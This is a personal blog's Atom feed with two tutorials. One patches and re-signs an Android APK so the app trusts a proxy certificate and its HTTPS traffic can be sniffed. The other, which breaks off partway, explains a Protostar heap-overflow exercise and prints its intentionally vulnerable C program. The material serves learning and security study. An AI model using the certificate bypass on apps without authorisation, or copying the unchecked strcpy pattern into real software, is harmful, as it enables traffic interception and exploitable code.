<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">

  <title><![CDATA[David Xia]]></title>
  <link href="https://www.davidxia.com/atom.xml" rel="self"/>
  <link href="https://www.davidxia.com/"/>
  <updated>2020-10-20T17:35:36-04:00</updated>
  <id>https://www.davidxia.com/</id>
  <author>
    <name><![CDATA[David Xia]]></name>
    
  </author>
  <generator uri="http://octopress.org/">Octopress</generator>

  
  <entry>
    <title type="html"><![CDATA[How to Analyze Mobile App Traffic and Reverse Engineer Its Non-Public API]]></title>
    <link href="https://www.davidxia.com/2020/10/how-to-analyze-mobile-app-traffic-and-reverse-engineer-its-non-public-api/"/>
    <updated>2020-10-16T17:08:35-04:00</updated>
    <id>https://www.davidxia.com/2020/10/how-to-analyze-mobile-app-traffic-and-reverse-engineer-its-non-public-api</id>
    <content type="html"><![CDATA[<p>Have you ever wanted to analyze the traffic between a mobile app and its servers or reverse engineer
a mobile app&rsquo;s non-public API? Here&rsquo;s one way.</p>

<p>The basic principle is to proxy the traffic from the app through a computer you control on which you
can capture and analyze traffic. If the app you&rsquo;re interested in is using an unencrypted protocol
like HTTP, this is pretty easy. Just run a proxy on your computer and configure your mobile device
to proxy network traffic through your computer&rsquo;s IP.</p>

<!-- more -->


<p>Most apps these days, however, use encrypted protocols like HTTPS (or are even required to by
default by mobile OSes). Data at the TCP layer and below like IP addresses and port numbers are
visible in plaintext, but all application level data at the HTTPS layer is encrypted. So you run a
proxy that supports HTTPS on your computer, but then your app doesn&rsquo;t trust the self-signed TLS
certificate your computer presents. Mobile apps used to trust certificates that the mobile device&rsquo;s
system trusted. So you could just download the self-signed certificate onto the mobile device and
configure the mobile OS to trust it. But these days mobile app frameworks let developers customize
their app&rsquo;s network security settings (<a href="https://developer.android.com/training/articles/security-config.html">like so for Android</a>).</p>

<p>Let&rsquo;s say your mobile app has custom trust anchors or pins certificates. What do you do now? You can
either</p>

<ol>
<li>disable the certificate check completely</li>
<li>or alter the certificate check</li>
</ol>


<p>I&rsquo;m not familiar with how to do this on iOS (there seem to be good resources out there <a href="https://www.guardsquare.com/en/blog/iOS-SSL-certificate-pinning-bypassing">like
this</a>) so will show how to do option two on Android.</p>

<h2>Setup mobile device and app</h2>

<p>I don&rsquo;t have an Android so used an emulator called <a href="https://www.genymotion.com/">Genymotion</a>. I created a Samsung Galaxy S9
virtual device which is has a recent enough Android OS to run most mobile apps. In order to install
the mobile app from the Google Play Store I had to install <a href="https://docs.genymotion.com/paas/7.0/07_Installing_OpenGApps.html#from-the-open-gapps-website">OpenGApps</a>. I think I&rsquo;m also able to
download the APK from the web and drag and drop it into the emulator to install.</p>

<!-- installed Hinge APK from here by drag and drop into emulator window
https://hinge-app.en.uptodown.com/android/download -->


<h2>Install Charles Proxy TLS certificate on device</h2>

<p>To install the <a href="https://www.charlesproxy.com/documentation/using-charles/ssl-certificates/">Charles cert</a>, I had to open <a href="http://www.charlesproxy.com/getssl/">this page</a> in Chrome. The built-in browser in the
emulator didn&rsquo;t seem to prompt me to download the Charles cert, but Chrome did. I installed Chrome
by install OpenGApps and then installing Chrome from the Play store. I think I also needed to
configure the Android device to use Charles as its proxy with <a href="https://stackoverflow.com/a/32865855">these steps</a> in order to get the
certificate download prompt. Then I made the Android device trust it.</p>

<h2>Patch the Android app&rsquo;s network security config</h2>

<p>I used `apktool to decompile the APK.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>brew install apktool
</span><span class='line'>
</span><span class='line'>apktool d /path/to/app.apk
</span><span class='line'>cd app
</span><span class='line'>find . -name network_security_config.xml
</span><span class='line'>./res/xml/network_security_config.xml
</span><span class='line'>
</span><span class='line'>cat res/xml/network_security_config.xml
</span><span class='line'>
</span><span class='line'>&lt;?xml version="1.0" encoding="utf-8"?&gt;
</span><span class='line'>&lt;network-security-config&gt;
</span><span class='line'>    &lt;domain-config cleartextTrafficPermitted="true"&gt;
</span><span class='line'>        &lt;domain includeSubdomains="true"&gt;res.cloudinary.com&lt;/domain&gt;
</span><span class='line'>        &lt;domain includeSubdomains="true"&gt;app-res.cloudinary.com&lt;/domain&gt;
</span><span class='line'>    &lt;/domain-config&gt;
</span><span class='line'>&lt;/network-security-config&gt;</span></code></pre></td></tr></table></div></figure>


<p>The app only allows cleartext to the above two domains. I don&rsquo;t see any pinned certificates, but
there must be some defaults since the app didn&rsquo;t trust the same certs trusted by the Android OS. So
I updated <code>network_security_config.xml</code> to be the following.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>&lt;?xml version="1.0" encoding="utf-8"?&gt;
</span><span class='line'>&lt;network-security-config&gt;
</span><span class='line'>    &lt;domain-config cleartextTrafficPermitted="true"&gt;
</span><span class='line'>        &lt;domain includeSubdomains="true"&gt;res.cloudinary.com&lt;/domain&gt;
</span><span class='line'>        &lt;domain includeSubdomains="true"&gt;app-res.cloudinary.com&lt;/domain&gt;
</span><span class='line'>    &lt;/domain-config&gt;
</span><span class='line'>    &lt;base-config&gt;
</span><span class='line'>        &lt;trust-anchors&gt;
</span><span class='line'>            &lt;certificates src="system" /&gt;
</span><span class='line'>            &lt;certificates src="user" /&gt;
</span><span class='line'>        &lt;/trust-anchors&gt;
</span><span class='line'>    &lt;/base-config&gt;
</span><span class='line'>&lt;/network-security-config&gt;</span></code></pre></td></tr></table></div></figure>


<p>Then I tried recompiling the patched APK but got the following error.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>cd app
</span><span class='line'>apktool b . -o ~/Downloads/app-patched.apk
</span><span class='line'>
</span><span class='line'>I: Using Apktool 2.4.1
</span><span class='line'>I: Checking whether sources has changed...
</span><span class='line'>I: Smaling smali folder into classes.dex...
</span><span class='line'>I: Checking whether sources has changed...
</span><span class='line'>I: Smaling smali_classes10 folder into classes10.dex...
</span><span class='line'>I: Checking whether sources has changed...
</span><span class='line'>I: Smaling smali_classes9 folder into classes9.dex...
</span><span class='line'>I: Checking whether sources has changed...
</span><span class='line'>I: Smaling smali_classes7 folder into classes7.dex...
</span><span class='line'>I: Checking whether sources has changed...
</span><span class='line'>I: Smaling smali_classes6 folder into classes6.dex...
</span><span class='line'>I: Checking whether sources has changed...
</span><span class='line'>I: Smaling smali_classes8 folder into classes8.dex...
</span><span class='line'>I: Checking whether sources has changed...
</span><span class='line'>I: Smaling smali_classes3 folder into classes3.dex...
</span><span class='line'>I: Checking whether sources has changed...
</span><span class='line'>I: Smaling smali_classes4 folder into classes4.dex...
</span><span class='line'>I: Checking whether sources has changed...
</span><span class='line'>I: Smaling smali_classes5 folder into classes5.dex...
</span><span class='line'>I: Checking whether sources has changed...
</span><span class='line'>I: Smaling smali_classes2 folder into classes2.dex...
</span><span class='line'>I: Checking whether resources has changed...
</span><span class='line'>I: Building resources...
</span><span class='line'>W: invalid resource directory name: /Users/dxia/Downloads/app/./res navigation
</span><span class='line'>brut.androlib.AndrolibException: brut.common.BrutException: could not exec (exit code = 1): [/var/folders/y_/sjt8100n43g69mtr9t588d6r0000gp/T/brut_util_Jar_15064276297777137207.tmp, p, --forced-package-id, 127, --min-sdk-version, 21, --target-sdk-version, 29, --version-code, 160072564, --version-name, 7.21.0, --no-version-vectors, -F, /var/folders/y_/sjt8100n43g69mtr9t588d6r0000gp/T/APKTOOL339327577576851750.tmp, -e, /var/folders/y_/sjt8100n43g69mtr9t588d6r0000gp/T/APKTOOL5191817693537904820.tmp, -0, arsc, -I, /Users/dxia/Library/apktool/framework/1.apk, -S, /Users/dxia/Downloads/app/./res, -M, /Users/dxia/Downloads/app/./AndroidManifest.xml]</span></code></pre></td></tr></table></div></figure>


<p>This <a href="https://github.com/iBotPeaches/Apktool/issues/1978#issuecomment-452894225">Github issue comment</a> suggested I run that command with the <code>--use-aapt2</code> switch.
Then I got another error.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>apktool b --use-aapt2 . -o ~/Downloads/app-patched.apk
</span><span class='line'>
</span><span class='line'>I: Using Apktool 2.4.1
</span><span class='line'>I: Checking whether sources has changed...
</span><span class='line'>I: Checking whether sources has changed...
</span><span class='line'>I: Checking whether sources has changed...
</span><span class='line'>I: Checking whether sources has changed...
</span><span class='line'>I: Checking whether sources has changed...
</span><span class='line'>I: Checking whether sources has changed...
</span><span class='line'>I: Checking whether sources has changed...
</span><span class='line'>I: Checking whether sources has changed...
</span><span class='line'>I: Checking whether sources has changed...
</span><span class='line'>I: Checking whether sources has changed...
</span><span class='line'>I: Checking whether resources has changed...
</span><span class='line'>I: Building resources...
</span><span class='line'>W: /Users/dxia/Downloads/app-patched/./res/values/public.xml:2119: error: resource 'drawable/$avd_hide_password__0' has invalid entry name '$avd_hide_password__0'. Invalid character '$avd_hide_password__0'.
</span><span class='line'>W: /Users/dxia/Downloads/app-patched/./res/values/public.xml:2120: error: resource 'drawable/$avd_hide_password__1' has invalid entry name '$avd_hide_password__1'. Invalid character '$avd_hide_password__1'.
</span><span class='line'>W: /Users/dxia/Downloads/app-patched/./res/values/public.xml:2121: error: resource 'drawable/$avd_hide_password__2' has invalid entry name '$avd_hide_password__2'. Invalid character '$avd_hide_password__2'.
</span><span class='line'>W: /Users/dxia/Downloads/app-patched/./res/values/public.xml:2122: error: resource 'drawable/$avd_show_password__0' has invalid entry name '$avd_show_password__0'. Invalid character '$avd_show_password__0'.
</span><span class='line'>W: /Users/dxia/Downloads/app-patched/./res/values/public.xml:2123: error: resource 'drawable/$avd_show_password__1' has invalid entry name '$avd_show_password__1'. Invalid character '$avd_show_password__1'.
</span><span class='line'>W: /Users/dxia/Downloads/app-patched/./res/values/public.xml:2124: error: resource 'drawable/$avd_show_password__2' has invalid entry name '$avd_show_password__2'. Invalid character '$avd_show_password__2'.
</span><span class='line'>W: error: resource android:style/Animation.InputMethodFancy is private.
</span><span class='line'>W: error: resource android:style/Animation.VoiceInteractionSession is private.
</span><span class='line'>W: error: resource android:style/AlertDialog is private.
</span><span class='line'>W: /Users/dxia/Downloads/app-patched/./res/values-v24/styles.xml:10: error: style attribute 'android:attr/preferenceListStyle' is private.
</span><span class='line'>W: /Users/dxia/Downloads/app-patched/./res/values-v24/styles.xml:40: error: style attribute 'android:attr/preferenceListStyle' is private.
</span><span class='line'>W: /Users/dxia/Downloads/app-patched/./res/values-v24/styles.xml:70: error: style attribute 'android:attr/preferenceListStyle' is private.
</span><span class='line'>W: /Users/dxia/Downloads/app-patched/./res/values-v24/styles.xml:99: error: style attribute 'android:attr/preferenceListStyle' is private.
</span><span class='line'>W: /Users/dxia/Downloads/app-patched/./res/values-v28/styles.xml:8: error: style attribute 'android:attr/allowMassStorage' is private.
</span><span class='line'>W: /Users/dxia/Downloads/app-patched/./res/values-v26/styles.xml:13: error: resource android:attr/internalMaxWidth is private.
</span><span class='line'>W: /Users/dxia/Downloads/app-patched/./res/values-v26/styles.xml:16: error: resource android:attr/internalMaxWidth is private.
</span><span class='line'>W: /Users/dxia/Downloads/app-patched/./res/values-v26/styles.xml:20: error: style attribute 'android:attr/internalMinHeight' is private.
</span><span class='line'>W: /Users/dxia/Downloads/app-patched/./res/values-v28/styles.xml:17: error: resource android:attr/allowMassStorage is private.
</span><span class='line'>W: /Users/dxia/Downloads/app-patched/./res/values-v28/styles.xml:20: error: resource android:attr/allowMassStorage is private.
</span><span class='line'>W: error: resource android:style/DialogWindowTitle is private.
</span><span class='line'>W: /Users/dxia/Downloads/app-patched/./res/values-v23/styles.xml:13: error: style attribute 'android:attr/attr/private_resource_pad36' not found.
</span><span class='line'>W: /Users/dxia/Downloads/app-patched/./res/values-v23/styles.xml:14: error: style attribute 'android:attr/attr/private_resource_pad35' not found.
</span><span class='line'>W: /Users/dxia/Downloads/app-patched/./res/values-v23/styles.xml:20: error: style attribute 'android:attr/attr/private_resource_pad36' not found.
</span><span class='line'>W: /Users/dxia/Downloads/app-patched/./res/values-v23/styles.xml:21: error: style attribute 'android:attr/attr/private_resource_pad35' not found.
</span><span class='line'>W: /Users/dxia/Downloads/app-patched/./res/values-v23/styles.xml:24: error: resource android:attr/private_resource_pad31 not found.
</span><span class='line'>W: /Users/dxia/Downloads/app-patched/./res/values-v26/styles.xml:10: error: style attribute 'android:attr/internalMinHeight' is private.
</span><span class='line'>brut.androlib.AndrolibException: brut.common.BrutException: could not exec (exit code = 1): [/var/folders/y_/sjt8100n43g69mtr9t588d6r0000gp/T/brut_util_Jar_11817644492691338390.tmp, link, -o, /var/folders/y_/sjt8100n43g69mtr9t588d6r0000gp/T/APKTOOL6551307854758959712.tmp, --package-id, 127, --min-sdk-version, 21, --target-sdk-version, 29, --version-code, 160072564, --version-name, 7.21.0, --no-auto-version, --no-version-vectors, --no-version-transitions, --no-resource-deduping, -e, /var/folders/y_/sjt8100n43g69mtr9t588d6r0000gp/T/APKTOOL6723837428467013762.tmp, -0, arsc, -I, /Users/dxia/Library/apktool/framework/1.apk, --manifest, /Users/dxia/Downloads/app-patched/./AndroidManifest.xml, /Users/dxia/Downloads/app-patched/./build/resources.zip]</span></code></pre></td></tr></table></div></figure>


<p><a href="https://github.com/iBotPeaches/Apktool/issues/2386#issuecomment-669505659">This PR</a> fixes the above on Linux and Windows. As of this writing, it&rsquo;s not released
yet. So I had to <a href="https://ibotpeaches.github.io/Apktool/build/">build from source</a> on an Ubuntu VM.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>java -jar ~/Apktool/brut.apktool/apktool-cli/build/libs/apktool-cli-all.jar b --use-aapt2 . -o ~/Downloads/app-patched.apk
</span><span class='line'>
</span><span class='line'>I: Using Apktool 2.4.2-3ac7e8-SNAPSHOT
</span><span class='line'>I: Checking whether sources has changed...
</span><span class='line'>I: Checking whether sources has changed...
</span><span class='line'>I: Checking whether sources has changed...
</span><span class='line'>I: Checking whether sources has changed...
</span><span class='line'>I: Checking whether sources has changed...
</span><span class='line'>I: Checking whether sources has changed...
</span><span class='line'>I: Checking whether sources has changed...
</span><span class='line'>I: Checking whether sources has changed...
</span><span class='line'>I: Checking whether sources has changed...
</span><span class='line'>I: Checking whether sources has changed...
</span><span class='line'>I: Checking whether resources has changed...
</span><span class='line'>I: Building apk file...
</span><span class='line'>I: Copying unknown files/dir...
</span><span class='line'>I: Built apk...</span></code></pre></td></tr></table></div></figure>


<p>I signed the patched APK. First I generated some keys. I&rsquo;m not sure if certain signing and key
algorithms are required, but these are the ones I used.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>keytool -genkey -alias keys -keystore keys -sigalg MD5withRSA -keyalg RSA -keysize 2048 -validity 10000
</span><span class='line'>
</span><span class='line'>Enter keystore password:
</span><span class='line'>Re-enter new password:
</span><span class='line'>What is your first and last name?
</span><span class='line'>  [Unknown]:
</span><span class='line'>What is the name of your organizational unit?
</span><span class='line'>  [Unknown]:
</span><span class='line'>What is the name of your organization?
</span><span class='line'>  [Unknown]:
</span><span class='line'>
</span><span class='line'>What is the name of your City or Locality?
</span><span class='line'>  [Unknown]:  What is the name of your State or Province?
</span><span class='line'>  [Unknown]:
</span><span class='line'>What is the two-letter country code for this unit?
</span><span class='line'>  [Unknown]:
</span><span class='line'>Is CN=Unknown, OU=Unknown, O=Unknown, L=Unknown, ST=Unknown, C=Unknown correct?
</span><span class='line'>  [no]:  yes
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>Warning:
</span><span class='line'>The generated certificate uses the MD5withRSA signature algorithm which is considered a security risk.
</span><span class='line'>
</span><span class='line'>jarsigner -sigalg MD5withRSA -digestalg SHA1 -verbose -keystore keys app-patched.apk keys</span></code></pre></td></tr></table></div></figure>


<p>Then when dragging and dropping the patched APK into the virtual device, I got an error saying the
app couldn&rsquo;t be installed. In these cases, generating the logs and grepping through them for errors
like <code>INSTALL_PARSE_FAILED_NO_CERTIFICATES</code> and <code>INSTALL_FAILED_VERIFICATION_FAILURE</code> helps. I fixed
this last error by <a href="https://stackoverflow.com/questions/15014519/apk-installation-failed-install-failed-verification-failure">disabling USB verification</a> in the virtual device
settings. The setting for this is inside the virtual Android device itself under &ldquo;developer
settings.&rdquo;</p>

<h2>Sniff the traffic</h2>

<p>I made sure the traffic was proxied through my computer, the patched app started successfully, and I
was able to see unencrypted data in Charles!</p>

<p><img class="center" src="https://i.imgur.com/e8p2Ne3h.jpg"></p>

<h2>References</h2>

<ul>
<li>&ldquo;<a href="https://gist.github.com/unoexperto/80694ccaed6dadc304ad5b8196cbbd2c">How to patch Android app to sniff its HTTPS traffic with self-signed certificate</a>&rdquo;</li>
</ul>

]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[How to Exploit Dlmalloc Unlink(): Protostar Level Heap3]]></title>
    <link href="https://www.davidxia.com/2020/04/how-to-exploit-dlmalloc-unlink/"/>
    <updated>2020-04-19T18:51:48-04:00</updated>
    <id>https://www.davidxia.com/2020/04/how-to-exploit-dlmalloc-unlink</id>
    <content type="html"><![CDATA[<p>While stuck inside during social distancing, I&rsquo;ve been making my way through LiveOverflow&rsquo;s awesome
Youtube playlist &ldquo;<a href="https://www.youtube.com/playlist?list=PLhixgUqwRTjxglIswKp9mpkfPNfHkzyeN">Binary Exploitation / Memory Corruption</a>.&rdquo; His videos are structured
around a well known series of <a href="https://exploit-exercises.lains.space/protostar/">exploit exercises here</a> called &ldquo;Protostar.&rdquo; I took the
time to truly understand each one before moving onto the next as the exercises build on each
other. For the past several days I&rsquo;ve been trying to understand the <a href="https://exploit-exercises.lains.space/protostar/heap3/">&ldquo;Heap3&rdquo;
level</a>, a relatively complex level that requires manipulating the heap to redirect code
execution to an arbitrary function. After rewatching the video many times and reading numerous other
online explanations, I finally understand! That moment of understanding feels so gratifying.</p>

<p>Many other resources already explain the exploit well, but I&rsquo;m writing my own explanation to
reinforce my understanding and to celebrate.</p>

<!-- more -->


<h2>Exploit Exercise Protostar Heap3</h2>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="cp">#include &lt;stdlib.h&gt;</span>
</span><span class='line'><span class="cp">#include &lt;unistd.h&gt;</span>
</span><span class='line'><span class="cp">#include &lt;string.h&gt;</span>
</span><span class='line'><span class="cp">#include &lt;sys/types.h&gt;</span>
</span><span class='line'><span class="cp">#include &lt;stdio.h&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="kt">void</span> <span class="nf">winner</span><span class="p">()</span>
</span><span class='line'><span class="p">{</span>
</span><span class='line'>  <span class="n">printf</span><span class="p">(</span><span class="s">&quot;that wasn&#39;t too bad now, was it? @ %d</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">time</span><span class="p">(</span><span class="nb">NULL</span><span class="p">));</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'>
</span><span class='line'><span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">)</span>
</span><span class='line'><span class="p">{</span>
</span><span class='line'>  <span class="kt">char</span> <span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="o">*</span><span class="n">b</span><span class="p">,</span> <span class="o">*</span><span class="n">c</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'>  <span class="n">a</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="mi">32</span><span class="p">);</span>
</span><span class='line'>  <span class="n">b</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="mi">32</span><span class="p">);</span>
</span><span class='line'>  <span class="n">c</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="mi">32</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'>  <span class="n">strcpy</span><span class="p">(</span><span class="n">a</span><span class="p">,</span> <span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
</span><span class='line'>  <span class="n">strcpy</span><span class="p">(</span><span class="n">b</span><span class="p">,</span> <span class="n">argv</span><span class="p">[</span><span class="mi">2</span><span class="p">]);</span>
</span><span class='line'>  <span class="n">strcpy</span><span class="p">(</span><span class="n">c</span><span class="p">,</span> <span class="n">argv</span><span class="p">[</span><span class="mi">3</span><span class="p">]);</span>
</span><span class='line'>
</span><span class='line'>  <span class="n">free</span><span class="p">(</span><span class="n">c</span><span class="p">);</span>
</span><span class='line'>  <span class="n">free</span><span class="p">(</span><span class="n">b</span><span class="p">);</span>
</span><span class='line'>  <span class="n">free</span><span class="p">(</span><span class="n">a</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'>  <span class="n">printf</span><span class="p">(</span><span class="s">&quot;dynamite failed?</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
</span><span class='line'><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure>


<p>The source code is pretty straightforward. There&rsquo;s the <code>main()</code> and <code>winner()</code> functions. There&rsquo;s
three character pointers, three <code>malloc()</code>&rsquo;s, three <code>strcpy()</code>&rsquo;s, three <code>free()</code>&rsquo;s, and finally a
<code>printf()</code>. Our goal is to redirect code execution from <code>main()</code> to <code>winner()</code>.</p>

<p>The description at the top of the level is</p>

<blockquote><p>This level introduces the Doug Lea Malloc (dlmalloc) and how heap meta data can be modified to
change program execution.</p></blockquote>

<p>All these exercises are on 32-bit x86 architecture.</p>

<h2>Background on dlmalloc</h2>

<p>The vulnerable malloc is usually referred to as dlmalloc (named after one of its authors Doug Lea)
and must be an old version like <a href="https://gist.github.com/davidxia/a00062a8e2494f6cc3068a4ba147c98e">this one from 1996</a>. The <a href="http://phrack.org/issues/57/9.html"><em>Phrack</em> article &ldquo;Once
Upon a free()&hellip;&rdquo;</a> provides useful background.</p>

<blockquote><p>Most malloc implementations share the behaviour of storing their own management information, such
as lists of used or free blocks, sizes of memory blocks and other useful data within the heap
space itself.</p>

<p>The central attack of exploiting malloc allocated buffer overflows is to modify this management
information in a way that will allow arbitrary memory overwrites afterwards.</p></blockquote>

<p>For our purposes, skip to the &ldquo;GNU C Library implementation&rdquo; section. It says that memory slices or
&ldquo;chunks&rdquo; created by malloc are organized  like so. On 32-bit systems, <code>prev_size</code> and <code>size</code> are
4 bytes each. <code>data</code> is the user data section. <code>malloc()</code> returns a pointer to the address where
<code>data</code> starts.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>.            +----------------------------------+
</span><span class='line'>    chunk -> | prev_size                        |
</span><span class='line'>             +----------------------------------+
</span><span class='line'>             | size                             |
</span><span class='line'>             +----------------------------------+
</span><span class='line'>      mem -> | data                             |
</span><span class='line'>             : ...                              :
</span><span class='line'>             +----------------------------------+
</span><span class='line'>nextchunk -> | prev_size ...                    |
</span><span class='line'>             :                                  :</span></code></pre></td></tr></table></div></figure>


<p>The other important things to know about the vulnerable version(s) of dlmalloc are:</p>

<ul>
<li>The lowest bit of <code>size</code> called <code>PREV_INUSE</code> indicates whether the previous chunk is used or not</li>
<li>Once we <code>free()</code> the chunk using <code>free(mem), the memory is released, and if
its neighboring chunks aren't free, dlmalloc will clear the next chunk's</code>PREV_INUSE<code>and add the
chunk to a doubly-linked list of other free chunks. It does this by adding a forward and backward
pointer at</code>mem`.</li>
</ul>


<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>.            +----------------------------------+
</span><span class='line'>    chunk -> | prev_size                        |
</span><span class='line'>             +----------------------------------+
</span><span class='line'>             | size                             |
</span><span class='line'>             +----------------------------------+
</span><span class='line'>      mem -> | fd                               |
</span><span class='line'>             +----------------------------------+
</span><span class='line'>             | bk                               |
</span><span class='line'>             +----------------------------------+
</span><span class='line'>             | (old memory, can be zero bytes)  |
</span><span class='line'>             :                                  :
</span><span class='line'>
</span><span class='line'>nextchunk -> | prev_size ...                    |
</span><span class='line'>             :                                  :</span></code></pre></td></tr></table></div></figure>


<ul>
